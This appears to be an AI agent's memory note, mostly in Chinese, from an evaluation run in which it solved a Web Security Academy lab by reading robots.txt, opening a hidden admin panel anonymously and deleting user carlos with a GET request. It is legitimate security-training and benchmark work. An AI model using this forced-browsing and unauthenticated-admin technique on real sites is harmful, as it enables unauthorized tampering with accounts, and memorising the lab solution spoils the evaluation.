---
metadata:
  node_type: memory
name: "Eval arm B - unprotected admin functionality optimized tree"
description: "arm B 优化树评测:lab-unprotected-admin-functionality 冷实例一次通过 - page_read→range_launch(reused:false)→robots.txt→匿名 /administrator-panel→delete carlos→banner_verdict solved"
last_updated: 2026-10-08T17:57:28+08:00
created: 2026-10-08T17:57:28+08:00
---

## 2026-10-08 arm B 评测 - lab-unprotected-admin-functionality 优化后树

- 实例:`https://0a100038049ecf8c80b22ba6002000fd.web-security-academy.net/`,range_launch `reused:false`(冷实例,故解题而非仅记机制)。jar `/tmp/cj1.json` 有效。
- 机制链(全程走件,零裸 curl):
  1. `page_read` 题页 → widget-lab-id `EFB3...8DE2`,题面确认目标=删除 carlos。
  2. `range_launch launch <id> --jar /tmp/cj1.json` 首次 TLS EOF(已知抖动),原样重试即通。
  3. `http_session get /robots.txt` → `Disallow: /administrator-panel`(匿名 200)。
  4. `http_session get /administrator-panel`(匿名会话,cookie 仅匿名 session)→ 200,页面直接列出 wiener/carlos 与 `/administrator-panel/delete?username=carlos`;banner `is-notsolved`。
  5. `http_session get /administrator-panel/delete?username=carlos` → 302 → `/administrator-panel`。
  6. `banner_verdict` → `solved:true`,`Congratulations, you solved the lab!`。
- 判定:一次通过(6 步含 1 次抖动重试),无关卡。
- 观察:manage/delete 动作是 GET+query,无需 CSRF token、无认证判定——漏洞根因即"鉴权只做隐藏不做校验"。
- 纪律:未读题解 details、未读 records/memory 本题记录、未读 campaign 语料;未 git 提交。

